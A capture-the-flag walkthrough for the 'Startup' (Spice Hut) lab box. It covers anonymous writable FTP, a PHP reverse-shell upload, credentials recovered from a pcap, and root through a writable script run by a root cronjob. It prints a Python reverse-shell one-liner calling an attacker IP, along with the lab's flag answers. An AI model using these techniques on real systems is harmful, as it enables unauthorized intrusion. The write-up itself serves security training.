# Startup

***Title: Spice Hut***

We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!

# What is the secret spicy soup recipe?

***Hint: FTP and HTTP. What could possibly go wrong?***

## Initial foothold

3 services are exposed:

~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.8.50.72
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## FTP

The FTP service allows anonymous access and hosts several files:

~~~
kali@kali:/data/vpn$ ftp startup.thm 
Connected to startup.thm.
220 (vsFTPd 3.0.3)
Name (startup.thm:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 .
drwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 ..
-rw-r--r--    1 0        0               5 Nov 12 04:53 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp
-rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
226 Directory send OK.
ftp> get .test.log -
remote: .test.log
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .test.log (5 bytes).
test
226 Transfer complete.
5 bytes received in 0.00 secs (5.3422 kB/s)
ftp> get important.jpg
local: important.jpg remote: important.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for important.jpg (251631 bytes).
226 Transfer complete.
251631 bytes received in 0.19 secs (1.2955 MB/s)
ftp> get notice.txt -
remote: notice.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for notice.txt (208 bytes).
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
226 Transfer complete.
208 bytes received in 0.00 secs (95.4535 kB/s)
ftp> cd ftp
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 .
drwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 ..
226 Directory send OK.
ftp> 
~~~

A username (`maya`) is disclosed in the note.

The `ftp` directory is world-writable!

~~~
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
~~~

## Web

An enumeration of the web directory reveals a `/files` directory:

~~~
kali@kali:/data/Startup$ gobuster dir -u http://startup.thm -x php,txt,old,bak,tar,zip -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://startup.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     tar,zip,php,txt,old,bak
[+] Timeout:        10s
===============================================================
2021/04/27 10:13:12 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.old (Status: 403)
/.hta.bak (Status: 403)
/.hta.tar (Status: 403)
/.hta.zip (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.old (Status: 403)
/.htaccess.bak (Status: 403)
/.htaccess.tar (Status: 403)
/.htaccess.zip (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.old (Status: 403)
/.htpasswd.bak (Status: 403)
/.htpasswd.tar (Status: 403)
/.htpasswd.zip (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/files (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2021/04/27 10:16:04 Finished
===============================================================
~~~

Browsing this directory confirms that it contains the resources exposed by the FTP service.

~~~
kali@kali:/data/Startup$ curl -s http://startup.thm/files/ | html2text 
****** Index of /files ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[DIR]]       ftp/             2020-11-12 04:53    -  
[[IMG]]       important.jpg    2020-11-12 04:02 246K  
[[TXT]]       notice.txt       2020-11-12 04:53  208  
===========================================================================
     Apache/2.4.18 (Ubuntu) Server at startup.thm Port 80
~~~

As we noticed there is a writable directory via FTP, let's upload a PHP reverse shell:

~~~
kali@kali:/data/Startup/files$ ftp startup.thm 
Connected to startup.thm.
220 (vsFTPd 3.0.3)
Name (startup.thm:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd ftp
250 Directory successfully changed.
ftp> put rev.php 
local: rev.php remote: rev.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5492 bytes sent in 0.00 secs (51.8572 MB/s)
ftp> 221 Goodbye.
kali@kali:/data/Startup/files$ 
~~~

Now, browsing the uploaded resource (http://startup.thm/files/ftp/rev.php) allows us to get a reverse shell:

~~~
kali@kali:/data/Startup/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.144.138] 37628
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 08:24:50 up 24 min,  0 users,  load average: 0.00, 0.02, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@startup:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

The recipe is in a `recipe.txt` file hosted at the root of the file system:

~~~
www-data@startup:/$ cd /
cd /
www-data@startup:/$ alias ll='ls -la'
alias ll='ls -la'
www-data@startup:/$ ll
ll
total 100
drwxr-xr-x  25 root     root      4096 Apr 27 08:01 .
drwxr-xr-x  25 root     root      4096 Apr 27 08:01 ..
drwxr-xr-x   2 root     root      4096 Sep 25  2020 bin
drwxr-xr-x   3 root     root      4096 Sep 25  2020 boot
drwxr-xr-x  16 root     root      3560 Apr 27 08:00 dev
drwxr-xr-x  96 root     root      4096 Nov 12 05:08 etc
drwxr-xr-x   3 root     root      4096 Nov 12 04:53 home
drwxr-xr-x   2 www-data www-data  4096 Nov 12 04:53 incidents
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25  2020 lib
drwxr-xr-x   2 root     root      4096 Sep 25  2020 lib64
drwx------   2 root     root     16384 Sep 25  2020 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25  2020 media
drwxr-xr-x   2 root     root      4096 Sep 25  2020 mnt
drwxr-xr-x   2 root     root      4096 Sep 25  2020 opt
dr-xr-xr-x 128 root     root         0 Apr 27 08:00 proc
-rw-r--r--   1 www-data www-data   136 Nov 12 04:53 recipe.txt
drwx------   4 root     root      4096 Nov 12 04:54 root
drwxr-xr-x  25 root     root       920 Apr 27 08:22 run
drwxr-xr-x   2 root     root      4096 Sep 25  2020 sbin
drwxr-xr-x   2 root     root      4096 Nov 12 04:50 snap
drwxr-xr-x   3 root     root      4096 Nov 12 04:52 srv
dr-xr-xr-x  13 root     root         0 Apr 27 08:00 sys
drwxrwxrwt   7 root     root      4096 Apr 27 08:25 tmp
drwxr-xr-x  10 root     root      4096 Sep 25  2020 usr
drwxr-xr-x   2 root     root      4096 Nov 12 04:50 vagrant
drwxr-xr-x  14 root     root      4096 Nov 12 04:52 var
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
www-data@startup:/$ cat recipe.txt
cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
~~~

Answer: `love`

# What are the contents of user.txt?

**Hint: Something doesn't belong.***

Enumarating files on the server leads to an `/incidents` directory owned by `www-data` and containing a network capture file named `suspicious.pcapng`.

Download the file and follow the streams. The 7th stream reveals credentials:

~~~
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:40:21 up 20 min,  1 user,  load average: 0.00, 0.03, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
vagrant  pts/0    10.0.2.2         17:21    1:09   0.54s  0.54s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
data
dev
etc
home
incidents
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
recipe.txt
root
run
sbin
snap
srv
sys
tmp
usr
vagrant
var
vmlinuz
vmlinuz.old
$ ls -la
total 96
drwxr-xr-x  26 root     root      4096 Oct  2 17:24 .
drwxr-xr-x  26 root     root      4096 Oct  2 17:24 ..
drwxr-xr-x   2 root     root      4096 Sep 25 08:12 bin
drwxr-xr-x   3 root     root      4096 Sep 25 08:12 boot
drwxr-xr-x   1 vagrant  vagrant    140 Oct  2 17:24 data
drwxr-xr-x  16 root     root      3620 Oct  2 17:20 dev
drwxr-xr-x  95 root     root      4096 Oct  2 17:24 etc
drwxr-xr-x   4 root     root      4096 Oct  2 17:26 home
drwxr-xr-x   2 www-data www-data  4096 Oct  2 17:24 incidents
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25 08:22 lib
drwxr-xr-x   2 root     root      4096 Sep 25 08:10 lib64
drwx------   2 root     root     16384 Sep 25 08:12 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 media
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 mnt
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 opt
dr-xr-xr-x 125 root     root         0 Oct  2 17:19 proc
-rw-r--r--   1 www-data www-data   136 Oct  2 17:24 recipe.txt
drwx------   3 root     root      4096 Oct  2 17:24 root
drwxr-xr-x  25 root     root       960 Oct  2 17:23 run
drwxr-xr-x   2 root     root      4096 Sep 25 08:22 sbin
drwxr-xr-x   2 root     root      4096 Oct  2 17:20 snap
drwxr-xr-x   3 root     root      4096 Oct  2 17:23 srv
dr-xr-xr-x  13 root     root         0 Oct  2 17:19 sys
drwxrwxrwt   7 root     root      4096 Oct  2 17:40 tmp
drwxr-xr-x  10 root     root      4096 Sep 25 08:09 usr
drwxr-xr-x   1 vagrant  vagrant    118 Oct  1 19:49 vagrant
drwxr-xr-x  14 root     root      4096 Oct  2 17:23 var
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
$ whoami
www-data
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@startup:/$ cd
cd
bash: cd: HOME not set
www-data@startup:/$ ls
ls
bin   etc	  initrd.img.old  media  recipe.txt  snap  usr	    vmlinuz.old
boot  home	  lib		  mnt	 root	     srv   vagrant
data  incidents   lib64		  opt	 run	     sys   var
dev   initrd.img  lost+found	  proc	 sbin	     tmp   vmlinuz
www-data@startup:/$ cd home
cd home
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ ls
ls
lennie
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: c4ntg3t3n0ughsp1c3

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: c4ntg3t3n0ughsp1c3

sudo: 3 incorrect password attempts
www-data@startup:/home$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
lennie:x:1002:1002::/home/lennie:
ftpsecure:x:1003:1003::/home/ftpsecure:
www-data@startup:/home$ exit
exit
exit
$ exit
~~~

* Username: `lennie`
* Password: `c4ntg3t3n0ughsp1c3`

Connecting against the SSH service using these credentials worked.

~~~
kali@kali:/data/Startup/files$ ssh lennie@startup.thm 
The authenticity of host 'startup.thm (10.10.144.138)' can't be established.
ECDSA key fingerprint is SHA256:xXyVGVy1l27TVcjIQj2kgTTmLYN6WCB93YJB3mAHLkA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'startup.thm,10.10.144.138' (ECDSA) to the list of known hosts.
lennie@startup.thm's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

44 packages can be updated.
30 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ python3 -c "import pty;pty.spawn('/bin/bash')"
lennie@startup:~$ alias ll='ls -la'
lennie@startup:~$ ll
total 24
drwx------ 5 lennie lennie 4096 Apr 27 08:32 .
drwxr-xr-x 3 root   root   4096 Nov 12 04:53 ..
drwx------ 2 lennie lennie 4096 Apr 27 08:32 .cache
drwxr-xr-x 2 lennie lennie 4096 Nov 12 04:53 Documents
drwxr-xr-x 2 root   root   4096 Nov 12 04:54 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12 04:53 user.txt
lennie@startup:~$ cat user.txt 
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
~~~

User flag: `THM{03ce3d619b80ccbfb3b7fc81e46c0e79}`

# What are the contents of root.txt?

**Hint: Scripts...***

Lennie's home directory contains an interesting script called `planner.sh`, which calls `/etc/print.sh`, owned by us.

~~~
lennie@startup:~/scripts$ ll
total 16
drwxr-xr-x 2 root   root   4096 Nov 12 04:54 .
drwx------ 5 lennie lennie 4096 Apr 27 08:32 ..
-rwxr-xr-x 1 root   root     77 Nov 12 04:53 planner.sh
-rw-r--r-- 1 root   root      1 Apr 27 09:03 startup_list.txt
lennie@startup:~/scripts$ cat planner.sh 
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
lennie@startup:~/scripts$ cat startup_list.txt 

lennie@startup:~/scripts$ cat /etc/print.sh 
#!/bin/bash
echo "Done!"
~~~

Running `pspy64` will confirm that `planner.sh` is running as a cronjob executed by root:

~~~
2021/04/27 09:11:01 CMD: UID=0    PID=2089   | /bin/bash /home/lennie/scripts/planner.sh 
2021/04/27 09:11:01 CMD: UID=0    PID=2088   | /bin/sh -c /home/lennie/scripts/planner.sh 
2021/04/27 09:11:01 CMD: UID=0    PID=2087   | /usr/sbin/CRON -f 
2021/04/27 09:12:01 CMD: UID=0    PID=2094   | /bin/bash /home/lennie/scripts/planner.sh 
2021/04/27 09:12:01 CMD: UID=0    PID=2093   | /bin/bash /home/lennie/scripts/planner.sh 
2021/04/27 09:12:01 CMD: UID=0    PID=2092   | /bin/sh -c /home/lennie/scripts/planner.sh 
2021/04/27 09:12:01 CMD: UID=0    PID=2091   | /usr/sbin/CRON -f 
~~~

Let's modify the `/etc/print.sh` script to call a reverse shell:

~~~
lennie@startup:~$ cat > /etc/print.sh << EOF 
#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.**.**",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
EOF
~~~

After a minute, we have a root shell:

~~~
kali@kali:/data/src$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.144.138] 37666
bash: cannot set terminal process group (2136): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# cd /root
cd /root
root@startup:~# ls -la
ls -la
total 28
drwx------  4 root root 4096 Nov 12 04:54 .
drwxr-xr-x 25 root root 4096 Apr 27 08:01 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4096 Nov 12 04:54 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   38 Nov 12 04:53 root.txt
drwx------  2 root root 4096 Nov 12 04:50 .ssh
root@startup:~# cat root.txt
cat root.txt
THM{f963aaa6a430f210222158ae15c3d76d}
~~~

Root flag: `THM{f963aaa6a430f210222158ae15c3d76d}`
